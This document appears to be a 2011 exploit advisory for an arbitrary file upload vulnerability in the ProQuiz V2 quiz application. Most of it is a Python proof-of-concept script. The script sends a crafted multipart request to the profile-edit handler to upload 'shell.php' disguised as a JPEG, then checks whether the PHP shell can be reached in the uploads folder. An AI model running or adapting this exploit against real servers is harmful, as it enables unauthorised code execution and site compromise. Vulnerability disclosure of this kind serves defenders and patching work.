# Software................ProQuiz V2
# Vulnerability...........Arbitrary Upload
# Download................http://proquiz.softon.org/
# Release Date............2/20/2011
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# ------------------------------------------------------------------------
#
# --Description--
#
# An arbitrary upload vulnerability in ProQuiz V2 can be exploited to
# upload a PHP shell.
#
#
# --PoC--
import socket
 
host = &#039;localhost&#039;
path = &#039;/proquizv2b&#039;
shell_path = path + &#039;/images/upload/users/.php&#039;
port = 80
 
def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)   
 
    s.send(&#039;POST &#039; + path + &#039;/functions.php?action=edit_profile&type=other HTTP/1.1\r\n&#039;
           &#039;Host: localhost\r\n&#039;
           &#039;Connection: keep-alive\r\n&#039;
           &#039;Referer: http://localhost/proquizv2b/my_account.php?action=getpage&page=edit_profile&type=other\r\n&#039;
           &#039;Content-Length: 718\r\n&#039;
           &#039;Cache-Control: max-age=0\r\n&#039;
           &#039;Origin: http://localhost\r\n&#039;
           &#039;User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.82 Safari/534.16\r\n&#039;
           &#039;Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4IQJE6qsLBAizBLu\r\n&#039;
           &#039;Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&#039;
           &#039;Accept-Encoding: gzip,deflate,sdch\r\n&#039;
           &#039;Accept-Language: en-US,en;q=0.8\r\n&#039;
           &#039;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n&#039;
           &#039;\r\n&#039;
           &#039;------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n&#039;
           &#039;Content-Disposition: form-data; name="fname"\r\n&#039;
           &#039;\r\n&#039;
           &#039;test\r\n&#039;
           &#039;------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n&#039;
           &#039;Content-Disposition: form-data; name="lname"\r\n&#039;
           &#039;\r\n&#039;
           &#039;test\r\n&#039;
           &#039;------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n&#039;
           &#039;Content-Disposition: form-data; name="profile"\r\n&#039;
           &#039;\r\n&#039;
           &#039;\r\n&#039;
           &#039;------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n&#039;
           &#039;Content-Disposition: form-data; name="dob"\r\n&#039;
           &#039;\r\n&#039;
           &#039;10/10/10\r\n&#039;
           &#039;------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n&#039;
           &#039;Content-Disposition: form-data; name="gender"\r\n&#039;
           &#039;\r\n&#039;
           &#039;m\r\n&#039;
           &#039;------WebKitFormBoundary4IQJE6qsLBAizBLu\r\n&#039;
           &#039;Content-Disposition: form-data; name="photo"; filename="shell.php"\r\n&#039;
           &#039;Content-Type: image/jpeg\r\n&#039;
           &#039;\r\n&#039;
           &#039;------WebKitFormBoundary4IQJE6qsLBAizBLu--\r\n&#039;)
 
    resp = s.recv(8192)
 
    http_redirect = &#039;HTTP/1.1 302&#039;
    http_ok = &#039;HTTP/1.1 200&#039;
     
    if http_redirect not in resp[:len(http_redirect)]:
        print &#039;error uploading shell&#039;
        return
    else: print &#039;shell uploaded&#039;
 
    s.send(&#039;GET &#039; + shell_path + &#039; HTTP/1.1\r\n&#039;\
           &#039;Host: &#039; + host + &#039;\r\n\r\n&#039;)
 
    if http_ok not in s.recv(8192)[:len(http_ok)]: print &#039;shell not found&#039;       
    else: print &#039;shell located at http://&#039; + host + shell_path
 
upload_shell()



